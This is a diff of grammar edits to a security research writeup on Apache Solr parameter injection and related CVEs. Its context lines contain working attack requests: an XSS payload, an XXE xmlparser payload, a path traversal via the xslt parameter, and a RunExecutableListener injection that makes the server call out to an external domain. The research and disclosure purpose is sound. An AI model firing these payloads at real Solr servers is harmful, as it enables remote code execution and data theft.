@@ -21,13 +21,13 @@
 ## Introduction
 This research is aimed to present a new vulnerability: "Solr parameter Injection" and describe how it may be exploited in different scenarios. It also accumulates all public exploits for Apache Solr.
 
-[Apache Solr](http://lucene.apache.org/solr/) is an open source enterprise search platform, written in Java, from the Apache Lucene project. Its major features include full-text search, hit highlighting, faceted search, dynamic clustering, and document parsing.  You may threat it like a database: you run the server, create a collection, and send different types of data to it (such as text, xml documents, pdf documents, pretty any format). Solr automatically index this data and provide a fast but rich REST API interface to search over it. The only protocol to talk to server is HTTP and yes, it's accessible without authentication by default, which makes it a perfect victim for different vulnerabilities. 
+[Apache Solr](http://lucene.apache.org/solr/) is an open source enterprise search platform, written in Java, from the Apache Lucene project. Its major features include full-text search, hit highlighting, faceted search, dynamic clustering, and document parsing.  You may threat it like a database: you run the server, create a collection, and send different types of data to it (such as text, xml documents, pdf documents, pretty any format). Solr automatically index this data and provide a fast but rich REST API interface to search over it. The only protocol to talk to server is HTTP and yes, it's accessible without authentication by default, which makes it a perfect victim for SSRF, CSRF and HTTP Request Smuggling attacks. 
 
 ## Solr API quick overview
-When you start a simple server (e.g. by using "./bin/solr start -e dih" command) it creates a web server on port 8983:
+When you start a Solr instance (e.g. by using "./bin/solr start -e dih" command) it creates a web server on port 8983:
 
 <p align="center"><img src="images/solr%20main1.png" alt="solr main" width="700"/></p>
-The default example comes with some data inside, so we can immediately search in it. This is a simple query that search for "Apple" keyword in all documents and returns the result in JSON:
+The default example comes with some data inside, so we can immediately search in it. This is a simple query that search for "Apple" keyword in all documents and returns the result in JSON format:
 
 <p align="center"><img src="images/simple%20query.png" alt="simple query.png" width="700"/></p>
 
@@ -36,19 +36,19 @@ A more complex query may look like this:
 <p align="center"><img src="images/complex%20query.png" alt="complex query.png" width="700"/></p>
 The main parameters here are:
 
-* **/solr/db/select** - "db" is the collection name, "/select" means we would like to perform a search operation handled by [SearchHandler](https://github.com/apache/lucene-solr/blob/master/solr/core/src/java/org/apache/solr/handler/component/SearchHandler.java)
+* **/solr/db/select** - "db" is the collection name, "/select" means we would like to perform a search operation handled by the [SearchHandler](https://github.com/apache/lucene-solr/blob/master/solr/core/src/java/org/apache/solr/handler/component/SearchHandler.java)
 
 * **q={!dismax+df=name}Apple** - This query searches for the "name" field  containing the "Apple" keyword, using the "dismax" query parser. The data between braces is parsed as [Solr local parameters](https://lucene.apache.org/solr/guide/6_6/local-parameters-in-queries.html)
 
-* **fl=\*,score,similar:[subquery]** - "fl" stands for field list to be returned, [[subquery] transformer](https://lucene.apache.org/solr/guide/6_6/transforming-result-documents.html#TransformingResultDocuments-_subquery_) allows to include data from another search query to the resulted document. In our case the subquery searches for the "computer" keyword.
+* **fl=\*,score,similar:[subquery]** - "fl" stands for field list to be returned, the [[subquery] transformer](https://lucene.apache.org/solr/guide/6_6/transforming-result-documents.html#TransformingResultDocuments-_subquery_) allows to include data from another search query to the resulted document. In our case the subquery searches for the "computer" keyword.
 
-Apart from the search, there is a possibility to perform update, view and modify the config, or even perform a replication. If we have access to the Solr Web Interface, we can upload and modify any data. By default, there is no users or roles, which makes it a perfect target for SSRF attacks.
+Apart from the search, there is a possibility to perform update operation, view and modify the config, or even perform a replication. If we have access to the Solr Web Interface, we can upload and modify any data and do almost any operation. By default, there is no users or roles, which makes it a perfect target for SSRF, CSRF and HTTP Request Smuggling attacks.
 
 ## Apache Solr Injection
-Like a database, in most cases, the Solr Rest API is not directly accessible to end users and used only by other applications. In these cases, we would like to introduce a couple of new attack against web applications who use Solr.
+Like a database, in most cases, the Solr Rest API is not directly accessible to end users and used only internally by other applications. In these cases, we would like to introduce a couple of new attack against web applications that use Solr.
 ### Solr Parameters Injection (HTTP smuggling)
 If a target web application uses untrusted user input when making HTTP API calls to Solr, it potentially does not properly encode the data with URL Encoding.
-Here is a simple java web application that accepts just one "q" parameter and preforms a search operation by making a server-to-server HTTP call to Solr:
+Here is a simple java web application that accepts just one "q" parameter and performs a search operation by making a server-to-server HTTP request to Solr:
 
 ```java
 @RequestMapping("/search")
@@ -62,8 +62,8 @@ public Object search1(@RequestParam String q) {
 }
 ```
 
-Since there is no URL encoding applied to this parameter, by sending payloads such as 'q=123%26param1=xxx%26param2=yyy' it is possible to inject additional HTTP query parameters to the Solr search request and change the logic how request is processed. The '%26' character here is the encoded version of the '&' character, which is a parameter delimiter in the HTTP query. 
-Normal request from a user to the web app:
+Since there is no URL encoding applied to this parameter, by sending payloads such as 'q=123%26param1=xxx%26param2=yyy' it is possible to inject additional HTTP query parameters to the Solr search request and change the logic how request is processed. The '%26' character here is the encoded version of the '&' character, which is a parameter delimiter in the HTTP query.<br/>
+A normal request from a user to the web app:
 
 `GET /search?q=Apple`
 
@@ -71,7 +71,7 @@ Leads to the following request from the web app to the Solr server:
 
 `GET /solr/db/select?q=Apple`
 
-Malicious request from a user to the web app:
+A malicious request from a user to the web app:
 
 `GET /search?q=Apple%26xxx=yyy`
 
@@ -79,7 +79,7 @@ Leads to the following request from the web app to the Solr server:
 
 <p>GET /solr/db/select?q=<font color="red">Apple&xxx=yyy</font></p>
 
-As you can see here, due to the vulnerability the 'q' parameter is decoded by the web app, but not properly encoded in the request to Solr server.
+As you can see here, due to the parameter injection vulnerability, the 'q' parameter is decoded by the web app, but not properly encoded in the request to Solr server.
 
 So, the main question is what we can do with it? Considering the request will be sent to the '/select' anyway, what parameters we can send to do something malicious on the Sorl side?
 
@@ -111,7 +111,7 @@ Another way to exploit this vulnerability is to alter the Solr response. The "fl
 `GET /solr/db/select?q=Apple&fl=name,price`
 
 When this parameter is tainted, we can leverage the [ValueAugmenterFactory](https://lucene.apache.org/solr/guide/6_6/transforming-result-documents.html#TransformingResultDocuments-_value_-ValueAugmenterFactory) **(fl=name:[value v='xxxx'])** to inject additional fields to the document, and specify the injected value ('xxxx') right inside the query.
-Moreover, in conjunction with Xml Transformer **(fl=name:[xml])** we can parse the provided value on the server side and include it to the result document without escaping. This technique may be used for XSS for example:
+Moreover, in conjunction with the Xml Transformer **(fl=name:[xml])** we can parse the provided value on the server side and include it to the result document without escaping. This technique may be used for XSS for example:
 
 `GET /solr/db/select?indent=on&q=*&wt=xml&fl=price,name:[value+v='<a:script+xmlns:a="http://www.w3.org/1999/xhtml">alert(1)</a:script>'],name:[xml]`
 
@@ -136,7 +136,7 @@ In this case it is still possible to specify the parser type and [Solr local par
 `GET /search?q={!type=_parser_type_+param=value}xxx`
 
 This attack [was described back in 2013](https://javahacker.com/abusing-the-solr-local-parameters-feature-localparams-injection/), but until 2017 nobody knew how to exploit it. 
-In 2017, we reported [CVE-2017-12629](https://www.exploit-db.com/exploits/43009) and discovered a way how trigger XXE by using 'xmlparser' parser and escalate it to Solr parameters injection vulnerability:
+In 2017, we reported [CVE-2017-12629](https://www.exploit-db.com/exploits/43009) and discovered a way how to trigger XXE by using 'xmlparser' parser and escalate it to the Solr parameters injection vulnerability:
 
 `GET /search?q={!xmlparser v='<!DOCTYPE a SYSTEM "http://127.0.0.1:/solr/gettingstarted/upload?stream.body={"xx":"yy"}&commit=true"'><a></a>'}`
 
@@ -174,7 +174,7 @@ Content-Length: 213
 }
 ```
 
-Exploit via Solr Parameter Injection:
+Exploit via Solr Parameters Injection:
 
 `GET /solr/db/select?q=xxx&shards=localhost:8983/solr/db/config%23&stream.body={"add-listener":{"event":"postCommit","name":"newlistener","class":"solr.RunExecutableListener","exe":"nslookup","dir":"/usr/bin/","args":["solrx.x.artsploit.com"]}}&isShard=true`
 
@@ -310,7 +310,7 @@ It allows to perform two types of attacks:
 **Target Solr version**: 1.3 – 8.2<br>
 **Requirements:** DataImportHandler should be enabled, which is not by default
 
-Solr has an optional [DataImportHandler](https://cwiki.apache.org/confluence/display/solr/DataImportHandler) that is useful to import data from databases, URLs and  is enabled, it is possible to include arbitrary JavaScript code inside the script tag of dataConfig parameter. Again, this feature is not documented but exist. This script will be executed on the Solr server for each imported document. 
+Solr has an optional [DataImportHandler](https://cwiki.apache.org/confluence/display/solr/DataImportHandler) that is useful to import data from databases or URLs,  It is possible to include arbitrary JavaScript code inside the script tag of dataConfig parameter that will be executed on the Solr server for each imported document. 
 
 Exploit via direct connection to the Solr server:
 
@@ -372,7 +372,7 @@ There is a path traversal vulnerability found by [Nicolas Grégoire](https://twi
 
 `GET /solr/db/select/?q=31337&wt=xslt&tr=../../../../../../../../../../../../../../../../../usr/share/ant/etc/ant-update.xsl`
 
-It could lead to remote code execution if an attacked has ability to upload a custom XSL file using the above-mentioned XXE or other vulnerability.
+It could lead to a remote code execution if an attacked has ability to upload a custom XSL file using the above-mentioned XXE or another vulnerability.
 
 ### 6. \[CVE-2017-3163] Arbitrary file read via path traversal attack in ReplicationHandler
 **Target Solr version**: <5.5.4 and <6.4.1
